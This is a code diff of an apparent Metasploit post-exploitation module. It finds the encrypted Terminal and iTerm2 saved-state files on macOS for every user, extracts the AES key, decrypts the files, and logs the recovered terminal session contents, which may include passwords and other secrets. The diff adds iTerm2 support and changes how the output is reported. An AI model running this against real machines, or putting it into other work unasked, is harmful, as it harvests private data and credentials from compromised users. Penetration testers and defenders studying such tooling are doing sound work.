@@ -7,6 +7,8 @@ import logging
 
 import re
 import sys
+import os
+import subprocess
 import json
 import struct
 import binascii
@@ -15,20 +17,13 @@ import cryptography.hazmat.backends
 import cryptography.hazmat.primitives.ciphers
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
-# this may need to move inside run so it doesn't crash all of msf if its not on the system
-try:
-    import hexdump
-except ImportError:
-    print('[e] Please install `hexdump` via pip')
-    sys.exit(-1)
-
-from lib.msf.post.osx import bplist
+import bplist
 
 metadata = {
-    'name': 'OSX Terminal Saved State File Recovery',
+    'name': 'OS X Terminal/iTerm2 Saved State File Recovery',
     'description': '''
-        This module enumerates the saved state files for the terminal
-        application on OSX.  These files are AES-128-CBC encrypted but
+        This module enumerates the saved state files for the Terminal and iTerm2
+        applications on OS X.  These files are encrypted with AES-128-CBC, but
         we're able to pull the key out as well for decryption.
         The files themselves contain an exact copy of what was sent
         to and from the terminal, which may include sensitive information.
@@ -39,14 +34,14 @@ metadata = {
         'kshitij Kumar <kshitij.kumar@crowdstrike.com>' # PoC
     ],
     'date': '2019-10-01',
-    'license': '<license>',
+    'license': 'BSD_LICENSE',
     'references': [
         {'type': 'url', 'ref': 'https://github.com/CrowdStrike/automactc/blob/master/modules/mod_terminalstate_v100.py'},
         {'type': 'url', 'ref': 'https://gist.github.com/williballenthin/ab23abd5eec5bf5a272bfcfb2342ec04'},
     ],
     'type': 'post',
     'options': {
-        'user': {'type': 'string', 'description': 'Which user\'s terminal save state files to pull', 'required': True, 'default': 'ALL'},
+        'USER': {'type': 'string', 'description': "Which user's terminal saved state files to pull", 'required': True, 'default': 'ALL'},
     }
 }
 
@@ -151,7 +146,7 @@ def parse_window_states(plist, data):
         try:
             window_state = parse_window_state(plist, buf)
         except ValueError as e:
-            logger.warning('failed to parse window state: {}'.format(e.args[0]))
+            logging.warning('failed to parse window state: {}'.format(e.args[0]))
             if len(e.args) > 1:
                 size = e.args[1]
                 buf = buf[size:]
@@ -163,63 +158,56 @@ def parse_window_states(plist, data):
         yield window_state
 
 def run(args):
+    try:
+        import hexdump
+    except ImportError:
+        module.log('Please install `hexdump` via pip3', level='error')
+        sys.exit(-1)
+
     module.LogHandler.setup()
     users = []
-    if args['user'] == 'ALL':
-        users = exec('ls /users/').split()
+    if args['USER'] == 'ALL':
+        users = subprocess.check_output(['ls', '/Users']).decode().split()
     else:
-        users = [args['user']]
+        users = [args['USER']]
 
     for user in users:
         logging.info('Enumerating files for {}'.format(user))
-        inputpath = '/users/{}/Library/Saved Application State/com.apple.Terminal.savedState/'.format(user)
+        inputpaths = [
+            '/Users/{}/Library/Saved Application State/com.apple.Terminal.savedState'.format(user),
+            '/Users/{}/Library/Saved Application State/com.googlecode.iterm2.savedState'.format(user)
+        ]
 
-        with read_file(os.path.join(inputpath, 'windows.plist'), 'rb') as f:
-            windows = bplist.load(f)
-            p = store_loot(
-                    'windows.plist',
-                    'text/plain',
-                    session,
-                    f,
-                    'windows.plist'
-                )
-            logging.info('windows.plist saved as: {}'.format(p))
+        for inputpath in inputpaths:
+            try:
+                with open(os.path.join(inputpath, 'windows.plist'), 'rb') as f:
+                    windows = bplist.load(f)
+                    logging.info('windows.plist loaded from {}'.format(f.name))
 
-        with read_file(os.path.join(inputpath, 'data.data'), 'rb') as f:
-            data = f.read()
-            p = store_loot(
-                    'data.data',
-                    'text/plain',
-                    session,
-                    data,
-                    'data.data'
-                )
-            logging.info('data.data saved as: {}'.format(p))
+                with open(os.path.join(inputpath, 'data.data'), 'rb') as f:
+                    data = f.read()
+                    logging.info('data.data loaded from {}'.format(f.name))
+            except (FileNotFoundError, PermissionError) as e:
+                logging.error(e)
+                continue
 
-        for i, window in enumerate(parse_window_states(windows, data)):
-            if not window.meta:
-                logging.error('no data for window {}'.format(i))
-                continue
-            if not 'NSTitle' in window.meta:
-                logger.info('skipping window, no title')
-                continue
-            logging.info('Window {} Title: {}'.format(i,window.meta['NSTitle']))
-            # the 33rd object is the start of the window data, so if less than that, we can safely skip
-            if len(window.state['$objects']) <= 32 :
-                continue
-            shell_content = window.state['$objects'][33:]
-            output = []
-            for line in shell_content:
-                if isinstance(line, bytes):
-                    output.append(line.decode('utf-8'))
-            p = store_loot(
-                    'terminal.output',
-                    'text/plain',
-                    session,
-                    ''.join(output),
-                    'terminal.output'
-                 )
-            logging.info('Terminal output {} saved as: {}'.format(i, p))
+            for i, window in enumerate(parse_window_states(windows, data)):
+                if not window.meta:
+                    logging.error('no data for window {}'.format(i))
+                    continue
+                if not 'NSTitle' in window.meta:
+                    logging.info('skipping window, no title')
+                    continue
+                logging.info('Window {} Title: {}'.format(i,window.meta['NSTitle']))
+                # the 33rd object is the start of the window data, so if less than that, we can safely skip
+                if len(window.state['$objects']) <= 32 :
+                    continue
+                shell_content = window.state['$objects'][33:]
+                output = []
+                for line in shell_content:
+                    if isinstance(line, bytes):
+                        output.append(line.decode('utf-8', errors='ignore'))
+                logging.info('Terminal output {} for user {}:\n{}'.format(i, user, ''.join(output)))
 
 
 if __name__ == "__main__":
